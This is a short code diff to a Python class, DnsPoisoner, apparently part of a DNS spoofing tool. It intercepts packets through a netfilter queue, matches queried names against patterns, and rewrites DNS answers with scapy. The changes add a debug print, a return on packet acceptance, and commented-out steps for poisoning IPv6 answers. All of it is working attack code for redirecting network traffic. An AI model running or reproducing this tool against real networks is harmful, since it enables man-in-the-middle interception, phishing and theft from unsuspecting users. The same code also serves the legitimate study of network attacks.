@@ -27,7 +27,9 @@ class DnsPoisoner():
     def get_ip(self, url):
         
         for url_pattern in self.urls_to_spoof.keys():
+
             if url_pattern.match(url):
+
                 return self.urls_to_spoof[url_pattern]
 
     def handle_packet(self, packet_nfqueue):
@@ -35,10 +37,11 @@ class DnsPoisoner():
         packet_scapy = IP(packet_nfqueue.get_payload())    #converts the raw packet to a scapy compatible string
 
         if packet_scapy.haslayer(DNSRR):
+            print "Packet has DNSRR"
             packet_scapy = self.edit_dnsrr(packet_scapy)    #edit packet for spoof
             packet_nfqueue.set_payload(bytes(packet_scapy))    #converts scapy compatible string back to raw packet
 
-        packet_nfqueue.accept()    #accept the packet and release it back into the wild
+        return packet_nfqueue.accept()    #accept the packet and release it back into the wild
 
     def edit_dnsrr(self, packet):
         """Edits DNS request answer in order to poison"""
@@ -59,6 +62,13 @@ class DnsPoisoner():
             # ipv6
             elif packet[DNSQR].qtype == 28:
                 pass # TODO wat te doen met ipv6?
+                # packet[DNSRR].rdata = ip_to_spoof
+                # packet[DNS].ancount = 1
+                # del(packet[IPv6].plen)
+                # del(packet[IPv6].fl)
+                # del(packet[IPv6].chksum)
+                # del(packet[UDP].len)
+                # del(packet[UDP].chksum)
 
         return packet
 
